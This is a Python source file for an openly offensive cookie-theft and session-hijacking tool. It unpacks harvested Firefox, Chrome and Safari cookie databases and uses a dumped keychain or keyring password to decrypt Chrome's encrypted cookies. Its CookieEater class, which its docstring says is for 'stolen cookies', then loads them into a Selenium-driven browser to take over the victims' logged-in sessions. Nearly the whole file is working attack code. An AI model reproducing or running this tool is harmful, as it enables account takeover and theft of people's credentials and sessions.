#!/env/usr/bin python
from os import getcwd, path
from glob import glob
from Crypto.Cipher import AES 
from hashlib import pbkdf2_hmac
from selenium import webdriver
from datetime import datetime
import platform
import sqlite3
import json
import lz4
import pathlib
import binascii
import struct
import time
import io
import re
import zipfile
# TODO: Support dumping from multiple Firefox (and Chrome?) profiles
    

class CookieSheet:
    """ 
    This is our class that will do all the heavy lifting, I like making it it's own class so
    that others can use it in their projects as well relatively easily. Plus sometimes you just want
    to run some other tools
    """
    def __init__(self,filename="cookie_dough.zip",keyDumpFile="k.zip"):
        """
        We setup all of the default stuff that we need here, we can if we want add in some other possible 
        variables that can be added, such as forcing the OS, Browser, and Cookie location. 
        """
        self.cookies = {}
        self.cookie_files = {}
        self.keyDumpFile = keyDumpFile
        if filename:
            self.unzipCookieDough(filename)
            self.operating_system = open("cookie_dough/package_info.txt","r").read()
        else:
            self.operating_system = ""

    def os(self):
        return self.operating_system

    def unzipCookieDough(self,filename):
        """
        Opens up the Zipfile and pulls a list of all of the files in it and sorts them into the cookie_files class 
        variable according to the folder that they are in inside of the cookie_dough.zip file

        Returns dictionary of arrays of files
        {'Chrome': ['cookie_dough/Chrome/Cookies'], 'Safari': ['cookie_dough/Safari/Cookies.binarycookies']}
        """
        zip_location = zipfile.ZipFile(filename)
        for file_name in zip_location.namelist()[1:]:
            t_array = self.cookie_files.get(file_name.split('/')[0],[])
            t_array.append("cookie_dough/%s"%(file_name))
            self.cookie_files[file_name.split('/')[0]] = t_array
        zip_location.extractall("cookie_dough")

    def loadFirefoxCookies(self):
        cookies = {}
        conn = sqlite3.connect(self.cookie_files["Firefox"][0])
        c = conn.cursor()
        query = "SELECT * FROM moz_cookies;"
        c.execute(query)
        cookie_dump = c.fetchall()
        
        # Actual cookie_dump includes (in order) id, baseDomain,
        # originAttributes, name, value, host, path, expiry, lastAccessed,
        # creationTime, isSecure, isHttpOnly, inBrowserElement
        for cookie in cookie_dump:
            dump = {}
            dump["domain"] = cookie[1]          # baseDomain
            dump["cookie-name"] = cookie[3]     # name
            dump["cookie-value"] = cookie[4]    # value
            dump["host"] = cookie[5]
            dump["path"] = cookie[6]
            dump["secure"] = False if cookie[8] == 0 else True

            if cookie[1] in cookies:
                cookies[cookie[1]].append(dump)
            else:
                cookies[cookie[1]] = []
                cookies[cookie[1]].append(dump)

        # Get the session cookies cause fucking Firefox --- how is this better
        # than storing in the main db?!? 
        if self.os() == "Linux":
            with open(self.cookie_files["Firefox"][1]) as f:
                recoveryJSON = json.load(f)
        else:
            compressJSON = open(self.cookie_files["Firefox"][1], "rb")
            if compressJSON.read(8) != b"mozLz40\0":
                raise InvalidHeader("Invalid magic number")
            tmpFile = open("recovery.json", "wb")
            data = lz4.decompress(compressJSON.read())
            tmpFile.write(data)
            tmpFile.close()
            with open("recovery.json") as f:
                recoveryJSON = json.load(f)

        try:
            sessions = recoveryJSON['windows'][0]['cookies']
        except:
            sessions = recoveryJSON['cookies']

        for session in sessions:
            dump = {}
            dump["domain"] = session['host'] 
            dump["cookie-name"] = session['name']
            dump["cookie-value"] = session['value']
            dump["host"] = session['host'] 
            dump["path"] = session['path']
            if 'secure' in session:
                dump["secure"] = True

            if session['host'] in cookies:
                cookies[session['host']].append(dump)
            else:
                cookies[session['host']] = []
                cookies[session['host']].append(dump)

        return cookies

    def loadChromeCookies(self):
        cookies = {}
        conn = sqlite3.connect(self.cookie_files["Chrome"][0])
        c = conn.cursor()
        query = "select * from cookies;"
        c.execute(query)
        cookie_dump = c.fetchall()

        # Actual cookie_dump includes (in order) creation_utc, host_key, name,
        # value, path, expires_utc, secure, httponly, last_access_utc,
        # has_expires, persistent, priority, encrypted_value, firstpartyonly
        for cookie in cookie_dump:
            dump = {}
            dump["domain"] = cookie[1]                                          # host_key       
            dump["cookie-name"] = cookie[2]                                     # name 
            dump["cookie-value"] = self.chrome_cookies(cookie[2], cookie[12])   # encrypted_value
            dump["host"] = cookie[1]                                            # host_key
            dump["path"] = cookie[4]
            dump["secure"] = False if cookie[6] == 0 else True

            if cookie[1] in cookies:
                cookies[cookie[1]].append(dump)
            else:
                cookies[cookie[1]] = []
                cookies[cookie[1]].append(dump)

        return cookies

    # Chrome Cookie Decryption Helper Functions  ===============================================================

    def clean(self, decrypted):
        # Shamelessly taken from n8henrie's pycookiecheat ---v
        # https://github.com/n8henrie/pycookiecheat
        """Strip padding from decrypted value.
    
        Remove number indicated by padding
        e.g. if last is '\x0e' then ord('\x0e') == 14, so take off 14.
    
        Args:
            decrypted: decrypted value
        Returns:
            Decrypted stripped of junk padding
    
        """
        last = decrypted[-1]
        if isinstance(last, int):
            return decrypted[:-last].decode('utf8')
        return decrypted[:-ord(last)].decode('utf8')


    def chrome_decrypt(self, encrypted_value, key, init_vector):
        # Shamelessly taken from n8henrie's pycookiecheat ---v
        # https://github.com/n8henrie/pycookiecheat
        """Decrypt Chrome/Chromium's encrypted cookies.
    
        Args:
            encrypted_value: Encrypted cookie from Chrome/Chromium's cookie file
            key: Key to decrypt encrypted_value
            init_vector: Initialization vector for decrypting encrypted_value
        Returns:
            Decrypted value of encrypted_value
    
        """
        # Encrypted cookies should be prefixed with 'v10' or 'v11' according to the
        # Chromium code. Strip it off.
        encrypted_value = encrypted_value[3:]
    
        cipher = AES.new(key, AES.MODE_CBC, IV=init_vector)
        decrypted = cipher.decrypt(encrypted_value)
    
        return self.clean(decrypted)


    def chromePassword(self, keyDumpFile=None):
        keyDumpFile = self.keyDumpFile if not keyDumpFile else keyDumpFile

        zip_location = zipfile.ZipFile(keyDumpFile)
        zip_location.extract("k.txt")
    
        if self.os() == "macOS":
            compiled = re.compile("Chrome Safe Storage\\\"\\n\s*\\\"type\\\"\<uint32\>=\<NULL\>\\n\s*data:\\n\s*\\\"(.*?)\\\"\\n")
            dump = open("k.txt","r").read()
            password = compiled.search(dump).group(1).strip()
        elif self.os() == "Linux":
            compiled = re.compile("\[login\] Chrome Safe Storage = (.*?)\n")
            dump = open("k.txt","r").read()
            password = compiled.search(dump).group(1).strip()

        return password


    def get_macOS(self):
        # Shamelessly taken from n8henrie's pycookiecheat ---v
        # https://github.com/n8henrie/pycookiecheat
        """Get settings for getting Chrome/Chromium cookies on macos.
    
        Returns:
            Config dictionary for Chrome/Chromium cookie decryption
    
        """

        config = {
            'my_pass': self.chromePassword(),
            'iterations': 1003
            }
        return config
    

    def get_Linux(self):
        # Shamelessly taken from n8henrie's pycookiecheat ---v
        # https://github.com/n8henrie/pycookiecheat
        """Get the settings for Chrome/Chromium cookies on Linux.
    
        Returns:
            Config dictionary for Chrome/Chromium cookie decryption
    
        """
        try:
            password = self.chromePassword()
        except:
            # Set the default linux password
            password = 'peanuts'

        config = {
            'my_pass': password,
            'iterations': 1
        }
    
        return config


    def chrome_cookies(self,cookie,encrypted_cookie):
        # Shamelessly taken from n8henrie's pycookiecheat ---v
        # https://github.com/n8henrie/pycookiecheat
        """Retrieve cookies from Chrome/Chromium on macos or Linux.
    
        Args:
            cookie: Plaintext cookie
            encrypted_cookie: Encrypted cookie
        Returns:
            Dictionary of cookie decryptedvalues
    
        """
        config = getattr(self, "get_"+self.os())()
        
        config['init_vector'] = b' ' * 16
        config['length'] = 16
        config['salt'] = b'saltysalt'
    
        # https://github.com/python/typeshed/pull/1241
        enc_key = pbkdf2_hmac(hash_name='sha1',                     # type: ignore
                      password=config['my_pass'].encode('utf8'),
                      salt=config['salt'],
                      iterations=config['iterations'],
                      dklen=config['length'])
    
        # if there is a not encrypted value or if the encrypted value
        # doesn't start with the 'v1[01]' prefix, return v
        if (encrypted_cookie[:3] not in (b'v10', b'v11')):
            pass
        else:
            cookie = self.chrome_decrypt(encrypted_cookie, key=enc_key,
        			 init_vector=config['init_vector'])

        return cookie

    # ==========================================================================================================

    def loadSafariCookies(self):
        """
        Pull the cookies from safari and decode them into a python hash.
        This code is shamelessly manipulated from the following ---v
        http://securitylearn.net/wp-content/uploads/tools/iOS/BinaryCookieReader.py
        """
        result_hash_names = ["domain","cookie-name","path","cookie-value"]
        cookie_results = []
        for cookie_file in self.cookie_files["Safari"]:
            domain_based_cookies = self.cookies.get("Safari",{})
            if cookie_file != None:
                try:
                    binary_file = open(cookie_file,"rb")
                except IOError as e:
                    print("File not found")
            else:
                binary_file = open(path.expandvars(self.ENVIRONMENT_HASH[self.os()]["Safari"]),"rb")
                
            file_header = binary_file.read(4)
            #if file_header != 'cook':
            #    return []
            num_pages=struct.unpack('>i',binary_file.read(4))[0] 
            page_sizes = []
            for np in range(num_pages):
                page_sizes.append(struct.unpack('>i',binary_file.read(4))[0])

            pages=[]
            for ps in page_sizes:
                pages.append(binary_file.read(ps)) 

            for page in pages:
                page=io.BytesIO(page)                                           #Converts the string to a file. So that we can use read/write operations easily.
                page.read(4)                                                    #page header: 4 bytes: Always 00000100
                num_cookies=struct.unpack('<i',page.read(4))[0]                 #Number of cookies in each page, first 4 bytes after the page header in every page.
                
                cookie_offsets=[]
                for nc in range(num_cookies):
                    cookie_offsets.append(struct.unpack('<i',page.read(4))[0])  #Every page contains >= one cookie. Fetch cookie starting point from page starting byte
            
                page.read(4)                                                    #end of page header: Always 00000000
            
                cookie=''
                for offset in cookie_offsets:
                    try:
                        page.seek(offset)                                       #Move the page pointer to the cookie starting point
                        cookiesize=struct.unpack('<i',page.read(4))[0]          #fetch cookie size
                        cookie=io.BytesIO(page.read(cookiesize))                #read the complete cookie 
                        
                        cookie.read(4)                                          #unknown
                        
                        flags=struct.unpack('<i',cookie.read(4))[0]             #Cookie flags:  1=secure, 4=httponly, 5=secure+httponly
                        cookie_flag_array=['','Secure','Unknown','Unknown','HttpOnly','Secure;HttpOnly','Unknown','Unknown','Unknown','Unknown','Unknown','Unknown','Unknown','Unknown','Unknown','Unknown']
                        cookie_flags = cookie_flag_array[flags]    
                        cookie.read(4)                                          #unknown
                        cookie_value_offsets = {}
                        for cookie_offset in result_hash_names:
                            cookie_value_offsets[cookie_offset] = struct.unpack('<i',cookie.read(4))[0]
                        
                        endofcookie=cookie.read(8)                              #end of cookie
                                                
                        expiry_date_epoch= struct.unpack('<d',cookie.read(8))[0]+978307200              #Expiry date is in Mac epoch format: Starts from 1/Jan/2001
                        expiry_date=time.strftime("%a, %d %b %Y ",time.gmtime(expiry_date_epoch))[:-1]  #978307200 is unix epoch of  1/Jan/2001 //[:-1] strips the last space
                                
                        create_date_epoch=struct.unpack('<d',cookie.read(8))[0]+978307200               #Cookies creation time
                        create_date=time.strftime("%a, %d %b %Y ",time.gmtime(create_date_epoch))[:-1]
                        
                        cookie_return_values = {}
                        cookie_return_values["Secure"] = "Secure" in cookie_flags
                        cookie_return_values["HttpOnly"] = "HttpOnly" in cookie_flags
                        for value_to_read in result_hash_names:
                            cookie.seek(cookie_value_offsets[value_to_read]-4)                          #fetch domaain value from url offset
                            cookie_return_values[value_to_read]=''
                            u=cookie.read(1)
                            while struct.unpack('<b',u)[0]!=0:
                                cookie_return_values[value_to_read]=cookie_return_values[value_to_read]+str(u)[-1]
                                u=cookie.read(1)
                        temp_domain_values = domain_based_cookies.get(cookie_return_values["domain"],[])
                        temp_domain_values.append(cookie_return_values)
                        domain_based_cookies[cookie_return_values["domain"]] = temp_domain_values
                        cookie_results.append(cookie_return_values)
                    except Exception as e: 
                        print(e)
            self.cookies["Safari"] = self.cookies.get("Safari",{}).update(cookie_return_values)
        return cookie_results


class CookieEater:
    """
    Cookie consumption class --- this class supports methods that allow users
    to open active sessions with the stolen cookies.
    """

    def __init__(self):
        """
        All the defaults --- instantiating the class will automagically load
        the cookies into the cookieJar.
        """
        cookies = CookieSheet()
        self.COOKIE_JAR = {}
        try:
            self.COOKIE_JAR["Firefox"] = cookies.loadFirefoxCookies()
        except:
            pass

        try:
            self.COOKIE_JAR["Chrome"] = cookies.loadChromeCookies()
        except:
            pass

        try:
            self.COOKIE_JAR["Safari"] = cookies.loadSafariCookies()
        except:
            pass
        print("Cookies found from the following browsers:")
        print(self.COOKIE_JAR.keys())

    def listDomains(self, browser=None):
        """
        This will list out the sites associated with the pulled cookies. If a
        browser is specified then only sites for that browser will be listed,
        otherwise all sites are returned.
        """
        for browser in self.COOKIE_JAR.keys():
            print("=================================== "+browser+" ===================================")
            self.getDomains(browser)

    def getDomains(self, browser):
        for domain in self.COOKIE_JAR[browser]:
            print(domain)

    def openBrowserSession(self, domain, browserCookieStore, browser="Firefox"):
        """
        CAUTION: Work in Progress
        -------------------------
        This will open up the chosen site in Firefox (default) or Chrome.
        """
        driver = webdriver.Firefox() if browser == "Firefox" else webdriver.Chrome()
        http = "https://" if self.COOKIE_JAR[browserCookieStore][domain][0]["secure"] else "http://"
        driver.get(http+domain)

        domainCookies = self.COOKIE_JAR[browserCookieStore][domain]
        for cookie in domainCookies:
        # Additional keys:
        # 'secure' -> Boolean
        # 'expiry' -> Milliseconds since the Epoch it should expire
            driver.add_cookie({'name':cookie['cookie-name'], 'value':cookie['cookie-value'], 'path':cookie['path'], 'domain':domain})
        driver.get(http+domain+cookie['path'])

    def saveCookies(self):
        browsers = self.COOKIE_JAR.keys()
        allTheCookiesFile = open("Cookies.json", "w+")
        for browser in browsers:
            cookieFile = open(browser+"Cookies.json", "w+")
            cookieFile.write(json.dumps(self.COOKIE_JAR[browser]))
            allTheCookiesFile.write(json.dumps(self.COOKIE_JAR[browser]))
            cookieFile.close()
        allTheCookiesFile.close()


def main():
    
    dumpCookies = CookieEater()
    dumpCookies.saveCookies()


if __name__ == "__main__":
    main()

